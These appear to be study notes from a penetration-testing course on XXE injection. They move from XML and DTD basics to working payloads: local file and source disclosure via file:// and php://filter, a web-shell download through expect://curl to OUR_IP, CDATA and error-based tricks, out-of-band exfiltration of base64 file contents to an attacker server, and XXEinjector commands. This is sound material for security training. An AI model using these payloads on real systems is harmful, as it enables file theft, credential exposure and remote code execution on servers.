
        --XML

    Extensible Markup Language (XML) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a tag, and the first element is called the root element, while other elements are child elements.



    some characters are used as part of an XML document structure, like <, >, &, or ". So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. &lt;, &gt;, &amp;, &quot;). Finally, we can write comments in XML documents between <!-- and -->, similar to HTML documents.



    ---XML DTD

    XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. 

    eg


    <!DOCTYPE email [
    <!ELEMENT email (date, time, sender, recipients, body)>
    <!ELEMENT recipients (to, cc?)>
    <!ELEMENT cc (to*)>
    <!ELEMENT date (#PCDATA)>
    <!ELEMENT time (#PCDATA)>
    <!ELEMENT sender (#PCDATA)>
    <!ELEMENT to  (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
    ]>

    As we can see, the DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).


    The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd), and then referenced within the XML document with the SYSTEM keyword, as follows:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email SYSTEM "email.dtd">


    It is also possible to reference a DTD through a URL, as follows:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">



    --XML Entities

    We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
        <!ENTITY company "Inlane Freight">
    ]>



    Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. &company;). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path, as follows:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
        <!ENTITY company SYSTEM "http://localhost/company.txt">
        <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
    ]>


    Note: We may also use the PUBLIC keyword instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en"). In this module, we'll be using SYSTEM, but we should be able to use either in most cases.




        --Local File Disclosure

    
    The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input.Something like a Contact Form:


    To print the content of an external file to the page, we should note which elements are being displayed, such that we know which elements to inject into. In some cases, no elements may be displayed.

    Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.


    --Reading Sensitive Files

    <!DOCTYPE email [
    <!ENTITY company SYSTEM "file:///etc/passwd">
    ]>


    Tip: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.


    --Reading Source Code

    Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.

    So, let us see if we can use the same attack to read the source code of the index.php file, as follows:

    <!DOCTYPE email [
    <!ENTITY company SYSTEM "file://index.php">
    ]>


    this did not work, as we did not get any content. This happened because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity. If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

    Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using file:// as our reference, we will use PHP's php://filter/ wrapper. With this filter, we can specify the convert.base64-encode encoder as our filter, and then add an input resource (e.g. resource=index.php), as follows:

    <!DOCTYPE email [
        <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>

    This trick only works with PHP web applications. 


    ----Remote Code Execution with XXE

    In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the PHP://expect filter, though this requires the PHP expect module to be installed and enabled.

    The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

    $ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

    $ sudo python3 -m http.server 80

    <?xml version="1.0"?>
    <!DOCTYPE email [
        <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
    ]>
    <root>
    <name></name>
    <tel></tel>
    <email>&company;</email>
    <message></message>
    </root>

    Note: We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.

    Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.



    --Other XXE Attacks

    Another common attack often carried out through XXE vulnerabilities is SSRF exploitation, which is used to enumerate locally open ports and access their pages, among other restricted web pages, through the XXE vulnerability.



    --Advanced File Disclosure

    Not all XXE vulnerabilities may be straightforward to exploit, as we have seen in the previous section. Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.


    -- Exfiltration with CDATA


    To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

    One easy way to tackle this issue would be to define a begin internal entity with <![CDATA[, an end internal entity with ]]>, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:

    <!DOCTYPE email [
    <!ENTITY begin "<![CDATA[">
    <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
    <!ENTITY end "]]>">
    <!ENTITY joined "&begin;&file;&end;">
    ]>

    After that, if we reference the &joined; entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.

    To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:

    <!ENTITY joined "%begin;%file;%end;">


    et's try to read the submitDetails.php file by first storing the above line in a DTD file (e.g. xxe.dtd), host it on our machine, and then reference it as an external entity on the target web application, as follows:

    $ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

    $ python3 -m http.server 8000

    we can reference our external entity (xxe.dtd) and then print the &joined; entity we defined above, which should contain the content of the submitDetails.php file, as follows:

    <!DOCTYPE email [
    <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
    <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
    %xxe;
    ]>
    ...
    <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->


    Note: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop)


    ---Error Based XXE


    Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be blind to the XML output and so would not be able to retrieve the file content using our usual methods.

    To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:

    <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

    
The above payload defines the file parameter entity and then joins it with an entity that does not exist.

%nonExistingEntity; does not exist, so the web application would throw an error saying that 
this entity does not exist, along with our joined %file; as part of the error. 


Now, we can call our external DTD script, and then reference the error entity, as follows:

<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>





        ---Out of Bound Exfiltration

    
For Something cases, we can utilize a method known as Out-of-band (OOB) Data Exfiltration
Instead of having the web application output our file entity to a specific XML entity, we will 
make the web application send a web request to our web server with the content of the file we 
are reading.

To do so, we can first use a parameter entity for the content of the file we are reading while 
utilizing PHP filter to base64 encode it.

Then, we will create another external parameter entity and reference it to our IP
and place the file parameter value as part of the URL being requested over HTTP, as follows:

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>



Tip: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize 
DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL 
(e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming 
traffic and decode the sub-domain string to get the data. Granted, this method is more advanced 
and requires more effort to exfiltrate data through.



            ---Automated OOB Exfiltration

    
    Although in some instances we may have to use the manual method we learned above, in many other 
    cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is 
    XXEinjector  ( https://github.com/enjoiz/XXEinjector ). This tool supports most of the tricks we learned in this module, including basic 
    XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.


    Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the 
    tool to use. We should not include the full XML data, only the first line, and write XXEINJECT 
    after it as a position locator for the tool:

    <?xml version="1.0" encoding="UTF-8" ?>
    XXEINJECT

    $ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd 
    --oob=http --phpfilter


    $ cat Logs/10.129.201.94/etc/passwd.log 

    




